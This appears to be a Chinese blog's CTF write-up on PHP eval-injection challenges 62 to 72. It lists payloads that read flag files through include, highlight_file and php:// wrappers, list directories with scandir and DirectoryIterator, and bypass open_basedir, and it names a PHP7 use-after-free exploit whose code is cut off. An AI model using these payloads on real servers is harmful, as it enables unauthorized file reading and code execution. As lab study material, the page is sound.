        <h2 id="62">
          <a href="#62" class="heading-link"><i class="fas fa-link"></i></a><a href="#62" class="headerlink" title="62"></a>62</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&quot;flag.php&quot;);echo $flag;</span><br></pre></td></tr></table></div></figure>

<p>&#x5305;&#x542B;&#x4E86;&#x4E0D;&#x8F93;&#x51FA;&#xFF0C;&#x56E0;&#x4E3A;&#x77E5;&#x9053;&#x53D8;&#x91CF;&#x540D;&#x5B57;&#x662F;flag&#xFF1F;&#xFF08;&#x89C6;&#x9891;&#x65B9;&#x6CD5;&#xFF09;</p>

        <h2 id="63">
          <a href="#63" class="heading-link"><i class="fas fa-link"></i></a><a href="#63" class="headerlink" title="63"></a>63</h2>
      <p>&#x7559;&#x4E2A;&#x5751;&#x3002;&#x3002;&#x519B;&#x8BAD;&#x53BB;&#x4E86;&#xFF0C;&#x7528;var_dump&#x8F93;&#x51FA;&#x53D8;&#x91CF;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5305;&#x542B;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x7528;&#x5230;&#x7684;&#x51FD;&#x6570;&#x6709;&#xFF1A;</span><br><span class="line">include()</span><br><span class="line">var_dump()</span><br><span class="line">get_defined_var()</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&quot;flag.php&quot;);var_dump(get_defined_vars());</span><br></pre></td></tr></table></div></figure>

<p>include &#x8BED;&#x53E5;&#x5305;&#x542B;&#x5E76;&#x8FD0;&#x884C;&#x6307;&#x5B9A;&#x6587;&#x4EF6;&#x3002;</p>

        <h2 id="64">
          <a href="#64" class="heading-link"><i class="fas fa-link"></i></a><a href="#64" class="headerlink" title="64"></a>64</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(&quot;./&quot;));</span><br></pre></td></tr></table></div></figure>

<p>&#x55EF;&#xFF0C;&#x8FD9;&#x4E09;&#x6761;&#x662F;&#x8BFB;&#x53D6;&#x76EE;&#x5F55;&#x7684;&#x59FF;&#x52BF;&#xFF1A;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=$a=opendir(&apos;./&apos;);while(($file = readdir($a)) !=false){echo $file.&quot; &quot;;}</span><br><span class="line"></span><br><span class="line">c=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></div></figure>

<p>&#x9E3D;&#x4E86;&#xFF0C;&#x6709;&#x4E94;&#x79CD;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x8BFB;&#x53D6;&#xFF1B;&#xFF08;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;&#x8FD9;&#x4E00;&#x9053;&#x9898;&#xFF09;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x603B;&#x7ED3;&#xFF1A;</span><br><span class="line">1.&#x6CA1;&#x88AB;&#x7981;&#x7528;&#x7684;&#x51FD;&#x6570;</span><br><span class="line">show_source</span><br><span class="line">higlight_file</span><br><span class="line">rename()</span><br><span class="line">copy()</span><br><span class="line">print_r()</span><br><span class="line">scandir()</span><br><span class="line">localeconv()</span><br><span class="line">current()</span><br><span class="line">2.include()&#x6587;&#x4EF6;&#x5305;&#x542B;</span><br><span class="line">3.UA&#x6CE8;&#x5165;&#xFF0C;&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;/var/log/nginx/access.log</span><br><span class="line">4.&#x5148;&#x5728;post&#x91CC;&#x9762;post&#x4E00;&#x4E2A;get&#x53D8;&#x91CF;&#xFF0C;get&#x91CC;&#x9762;&#x4F7F;&#x7528;&#x4F2A;&#x534F;&#x8BAE;php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">&#x6216;&#x8005;&#x4F7F;&#x7528;input(?)</span><br><span class="line">php://input/</span><br><span class="line">data://text/plain;base64,</span><br><span class="line">5.var_dump()   get_defined_vars()</span><br><span class="line">6.ssrf&#x7684;&#x65B9;&#x6CD5;&#xFF08;&#x5751;&#xFF09;</span><br></pre></td></tr></table></div></figure>

<p>&#x6587;&#x4EF6;&#x663E;&#x793A;&#xFF0C;&#x6587;&#x4EF6;&#x5305;&#x542B;&#xFF0C;&#x65E5;&#x5FD7;&#x5305;&#x542B;&#xFF0C;&#x4F2A;&#x534F;&#x8BAE;&#x8BFB;&#x53D6;&#xFF0C;&#x8F93;&#x51FA;&#x6CE8;&#x518C;&#x53D8;&#x91CF;</p>

        <h2 id="65">
          <a href="#65" class="heading-link"><i class="fas fa-link"></i></a><a href="#65" class="headerlink" title="65"></a>65</h2>
      <p>payload&#x65B0;&#x65E7;&#x7ED3;&#x5408;&#x59FF;&#x52BF;&#xFF1A;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></div></figure>


        <h2 id="66">
          <a href="#66" class="heading-link"><i class="fas fa-link"></i></a><a href="#66" class="headerlink" title="66"></a>66</h2>
      <p>&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x51E0;&#x79CD;&#x4E0D;&#x540C;&#x7684;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x76EE;&#x5F55;&#x7684;&#x65B9;&#x5F0F;&#xFF1A;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(&quot;/&quot;));</span><br><span class="line">c=print_r(scandir(&quot;/&quot;));</span><br><span class="line"></span><br><span class="line">&#x6CE8;&#x610F;payload&#x662F;&#x4E0B;&#x4E00;&#x7EA7;&#x7684;c=highlight_file(&quot;/flag.txt&quot;);</span><br></pre></td></tr></table></div></figure>


        <h2 id="67">
          <a href="#67" class="heading-link"><i class="fas fa-link"></i></a><a href="#67" class="headerlink" title="67"></a>67</h2>
      <p>&#x7531;&#x4E8E;include&#x5305;&#x542B;&#x4EE5;&#x540E;&#x4E0D;&#x7BA1;&#x6587;&#x4EF6;&#x7684;&#x540E;&#x7F00;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5305;&#x542B;flag.txt,&#x53C8;&#x56E0;&#x4E3A;&#x5728;&#x6587;&#x4EF6;&#x91CC;&#x9762;&#x6CA1;&#x6709;PHP&#x4EE3;&#x7801;&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x505A;HTML&#x76F4;&#x63A5;&#x8F93;&#x51FA;(67-68-69)</p>
<p>&#x7981;&#x7528;&#x4E86;highlight_file,print_r,show_source</p>

        <h2 id="68">
          <a href="#68" class="heading-link"><i class="fas fa-link"></i></a><a href="#68" class="headerlink" title="68"></a>68</h2>
      <p>&#x4F7F;&#x7528;&#x4E86;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&quot;/flag.txt&quot;);</span><br></pre></td></tr></table></div></figure>


        <h2 id="69">
          <a href="#69" class="heading-link"><i class="fas fa-link"></i></a><a href="#69" class="headerlink" title="69"></a>69</h2>
      <p>&#x4ECA;&#x5929;&#x5C31;&#x5148;&#x5230;70&#x5427;&#xFF0C;71&#x6709;&#x65B0;&#x51FD;&#x6570;</p>
<p>69&#x8FC7;&#x6EE4;&#x4E86;var_dump&#x548C;print_r</p>
<p>&#x8FD9;&#x91CC;&#x518D;&#x8BB0;&#x5F55;&#x4E00;&#x4E9B;&#x626B;&#x63CF;&#x76EE;&#x5F55;&#x7684;&#x65B9;&#x5F0F;&#xFF1A;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span></span><br><span class="line">glob</span><br><span class="line"><span class="title function_ invoke__">DictoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.</span><br><span class="line">c=</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">glob</span>(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$value</span>){</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot; &quot;</span>;</span><br><span class="line">}</span><br><span class="line"><span class="number">2</span>.</span><br><span class="line">c=</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&apos;glob:///*&apos;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>){</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&quot; &quot;</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></div></figure>

<p>&#x6CE8;&#x610F;&#x8FD9;&#x91CC;&#x7684;DirestoryIterator&#x539F;&#x751F;&#x7C7B;&#x91CC;&#x9762;&#x7684;toString&#x65B9;&#x6CD5;&#x524D;&#x9762;&#x6709;&#x4E24;&#x4E2A;&#x4E0B;&#x5212;&#x7EBF;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">glob</span>() &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x5339;&#x914D;&#x6307;&#x5B9A;&#x6A21;&#x5F0F;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x6216;&#x76EE;&#x5F55;&#x3002;</span><br><span class="line"></span><br><span class="line">&#x8BE5;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x6709;&#x5339;&#x914D;&#x6587;&#x4EF6; / &#x76EE;&#x5F55;&#x7684;&#x6570;&#x7EC4;&#x3002;&#x5982;&#x679C;&#x51FA;&#x9519;&#x8FD4;&#x56DE; <span class="literal">false</span>&#x3002;</span><br><span class="line"><span class="title function_ invoke__">glob</span>(pattern,flags)</span><br><span class="line">e.g.</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&quot;*.txt&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//&#x8F93;&#x51FA;</span></span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">[<span class="number">0</span>] =&gt; target.txt</span><br><span class="line">[<span class="number">1</span>] =&gt; source.txt</span><br><span class="line">[<span class="number">2</span>] =&gt; test.txt</span><br><span class="line">[<span class="number">3</span>] =&gt; test2.txt</span><br><span class="line">)</span><br></pre></td></tr></table></div></figure>

<p>&#x6458;&#x6284;&#x4E00;&#x6BB5;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Directorylterator&#x7C7B; &#x4E0E; FilesystemIterator &#x7C7B;&#x5F53;&#x6211;&#x4EEC;&#x4F7F;&#x7528;echo&#x51FD;&#x6570;&#x8F93;&#x51FA;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x89E6;&#x53D1;&#x8FD9;&#x4E24;&#x4E2A;&#x7C7B;&#x4E2D;&#x7684; __toString() &#x65B9;&#x6CD5;&#xFF0C;&#x8F93;&#x51FA;&#x6307;&#x5B9A;&#x76EE;&#x5F55;&#x91CC;&#x9762;&#x7279;&#x5B9A;&#x6392;&#x5E8F;&#x4E4B;&#x540E;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x540D;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x4E0D;&#x5FAA;&#x73AF;&#x904D;&#x5386;&#x7684;&#x8BDD;&#x662F;&#x4E0D;&#x80FD;&#x770B;&#x5230;&#x6307;&#x5B9A;&#x76EE;&#x5F55;&#x91CC;&#x7684;&#x5168;&#x90E8;&#x6587;&#x4EF6;&#x7684;&#x3002;&#x800C;GlobIterator &#x7C7B;&#x5728;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E0A;&#x89E3;&#x51B3;&#x4E86;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x3002;&#x7531;&#x4E8E; GlobIterator &#x7C7B;&#x652F;&#x6301;&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x6A21;&#x5F0F;&#x5339;&#x914D;&#x6765;&#x5BFB;&#x627E;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5047;&#x8BBE;&#x6211;&#x4EEC;&#x77E5;&#x9053;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x540D;&#x7684;&#x4E00;&#x90E8;&#x5206;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8BE5;&#x7C7B;&#x7684;&#x6A21;&#x5F0F;&#x5339;&#x914D;&#x627E;&#x5230;&#x5176;&#x5B8C;&#x6574;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x3002;&#x4F8B;&#x5982;&#xFF1A;&#x4F8B;&#x9898;&#x91CC;&#x6211;&#x4EEC;&#x77E5;&#x9053;&#x4E86;flag&#x7684;&#x6587;&#x4EF6;&#x540D;&#x7279;&#x5F81;&#x4E3A; &#x4EE5;f&#x5F00;&#x5934;&#x7684;.txt&#x6587;&#x4EF6;&#xFF0C;&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; GlobIterator&#x7C7B;&#x6765;&#x6A21;&#x5F0F;&#x5339;&#x914D;&#xFF1A;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h2 id="70">
          <a href="#70" class="heading-link"><i class="fas fa-link"></i></a><a href="#70" class="headerlink" title="70"></a>70</h2>
      <p>&#x540C;&#x7406;&#xFF0C;71&#x7528;&#x4E86;&#x65B0;&#x65B9;&#x6CD5;</p>

        <h2 id="71">
          <a href="#71" class="heading-link"><i class="fas fa-link"></i></a><a href="#71" class="headerlink" title="71"></a>71</h2>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&apos;display_errors&apos;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// &#x4F60;&#x4EEC;&#x5728;&#x70AB;&#x6280;&#x5417;&#xFF1F;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&apos;c&apos;</span>])){</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&apos;c&apos;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&#x4F60;&#x8981;&#x4E0A;&#x5929;&#x5417;&#xFF1F;</span><br></pre></td></tr></table></div></figure>

<p>&#x65B0;&#x51FD;&#x6570;&#xFF1A;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ini_set</span><br><span class="line">ob_get_contents</span><br><span class="line">ob_get_clean</span><br><span class="line"></span><br><span class="line">1.ini_set</span><br><span class="line">PHP ini_set&#x7528;&#x6765;&#x8BBE;&#x7F6E;php.ini&#x7684;&#x503C;&#xFF0C;&#x5728;&#x51FD;&#x6570;&#x6267;&#x884C;&#x7684;&#x65F6;&#x5019;&#x751F;&#x6548;&#xFF0C;&#x811A;&#x672C;&#x7ED3;&#x675F;&#x540E;&#xFF0C;&#x8BBE;&#x7F6E;&#x5931;&#x6548;&#x3002;&#x65E0;&#x9700;&#x6253;&#x5F00;php.ini&#x6587;&#x4EF6;&#xFF0C;&#x5C31;&#x80FD;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#xFF0C;&#x5BF9;&#x4E8E;&#x865A;&#x62DF;&#x7A7A;&#x95F4;&#x6765;&#x8BF4;&#xFF0C;&#x5F88;&#x65B9;&#x4FBF;&#x3002;</span><br><span class="line"></span><br><span class="line">&#x51FD;&#x6570;&#x683C;&#x5F0F;&#xFF1A;string ini_set(string $varname, string $newvalue)</span><br><span class="line"></span><br><span class="line">&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7684;&#x53C2;&#x6570;&#x90FD;&#x53EF;&#x4EE5;&#x914D;&#x7F6E;&#xFF0C;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x624B;&#x518C;&#x4E2D;&#x7684;&#x5217;&#x8868;&#x3002;</span><br><span class="line">e.g.</span><br><span class="line">@ ini_set(&apos;memory_limit&apos;, &apos;64M&apos;);</span><br><span class="line"></span><br><span class="line">&apos;menory_limit&apos;&#xFF1A;&#x8BBE;&#x5B9A;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#x6240;&#x80FD;&#x591F;&#x7533;&#x8BF7;&#x5230;&#x7684;&#x6700;&#x5927;&#x5185;&#x5B58;&#x5B57;&#x8282;&#x6570;&#xFF0C;&#x8FD9;&#x6709;&#x5229;&#x4E8E;&#x5199;&#x7684;&#x4E0D;&#x597D;&#x7684;&#x811A;&#x672C;&#x6D88;&#x8017;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x53EF;&#x7528;&#x5185;&#x5B58;&#x3002;@&#x7B26;&#x53F7;&#x4EE3;&#x8868;&#x4E0D;&#x8F93;&#x51FA;&#x9519;&#x8BEF;&#x3002;</span><br><span class="line"></span><br><span class="line">@ini_set(&apos;display_errors&apos;, 1);</span><br><span class="line"></span><br><span class="line">&#x2018;display_errors&apos;&#xFF1A;&#x8BBE;&#x7F6E;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x7684;&#x7C7B;&#x522B;&#x3002;</span><br><span class="line">2.ob_get_contents</span><br><span class="line">ob_get_contents(): string</span><br><span class="line">&#x53EA;&#x662F;&#x5F97;&#x5230;&#x8F93;&#x51FA;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x4F46;&#x4E0D;&#x6E05;&#x9664;&#x5B83;&#x3002;</span><br><span class="line">3.ob_get_clean</span><br><span class="line">ob_get_clean(): string</span><br><span class="line">&#x5F97;&#x5230;&#x5F53;&#x524D;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x5185;&#x5BB9;&#x5E76;&#x5220;&#x9664;&#x5F53;&#x524D;&#x8F93;&#x51FA;&#x7F13;&#x51B2;&#x533A;&#x3002;</span><br><span class="line"></span><br><span class="line">ob_get_clean() &#x5B9E;&#x8D28;&#x4E0A;&#x662F;&#x4E00;&#x8D77;&#x6267;&#x884C;&#x4E86; ob_get_contents() &#x548C; ob_end_clean()</span><br></pre></td></tr></table></div></figure>

<p><img src="/2022/06/20/6-20/6-20/1656486496034.png" alt="1656486496034"></p>

        <h2 id="72">
          <a href="#72" class="heading-link"><i class="fas fa-link"></i></a><a href="#72" class="headerlink" title="72"></a>72</h2>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x6E90;&#x7801;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&apos;display_errors&apos;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// &#x4F60;&#x4EEC;&#x5728;&#x70AB;&#x6280;&#x5417;&#xFF1F;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&apos;c&apos;</span>])){</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&apos;c&apos;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&#x4F60;&#x8981;&#x4E0A;&#x5929;&#x5417;&#xFF1F;</span><br></pre></td></tr></table></div></figure>



<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x6709;&#x65B0;&#x51FD;&#x6570;&#x88AB;&#x7981;&#x7528;</span><br><span class="line">var_dump</span><br><span class="line">ini_set</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x4F7F;&#x7528;&#x4E86;&#x65B0;&#x51FD;&#x6570;</span><br><span class="line"><span class="title function_ invoke__">open_basedir</span>();</span><br><span class="line"></span><br><span class="line">open_basedir&#x662F;php.ini&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x9009;&#x9879;&#xFF0C;&#x5B83;&#x53EF;&#x5C06;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x6587;&#x4EF6;&#x7684;&#x6D3B;&#x52A8;&#x8303;&#x56F4;&#x9650;&#x5236;&#x5728;&#x6307;&#x5B9A;&#x7684;&#x533A;&#x57DF;&#xFF0C;</span><br><span class="line">&#x5047;&#x8BBE;open_basedir=/home/wwwroot/home/web1/:/tmp/&#xFF0C;&#x90A3;&#x4E48;&#x901A;&#x8FC7;web1&#x8BBF;&#x95EE;&#x670D;&#x52A1;&#x5668;&#x7684;</span><br><span class="line">&#x7528;&#x6237;&#x5C31;&#x65E0;&#x6CD5;&#x83B7;&#x53D6;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x9664;&#x4E86;/home/wwwroot/home/web1/&#x548C;/tmp/&#x8FD9;&#x4E24;&#x4E2A;&#x76EE;&#x5F55;&#x4EE5;&#x5916;&#x7684;&#x6587;&#x4EF6;&#x3002;</span><br><span class="line">&#x6CE8;&#x610F;&#x7528;open_basedir&#x6307;&#x5B9A;&#x7684;&#x9650;&#x5236;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x524D;&#x7F00;,&#x800C;&#x4E0D;&#x662F;&#x76EE;&#x5F55;&#x540D;&#x3002;</span><br><span class="line">------------</span><br><span class="line">&#x5148;&#x7528;</span><br><span class="line">c=</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&apos;glob:///*.txt&apos;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>){</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&quot; &quot;</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#x626B;&#x63CF;&#x76EE;&#x5F55;</span><br><span class="line">&#x5F97;&#x5230;flag0.txt&#x6587;&#x4EF6;</span><br><span class="line">    -----</span><br><span class="line">    &#x540E;&#x9762;&#x4F7F;&#x7528;&#x811A;&#x672C;uaf</span><br></pre></td></tr></table></div></figure>

<p>PHP&#x7684;gcc&#x7684;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7684;&#x6F0F;&#x6D1E;&#xFF1B;php7-backtrace-bypass</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 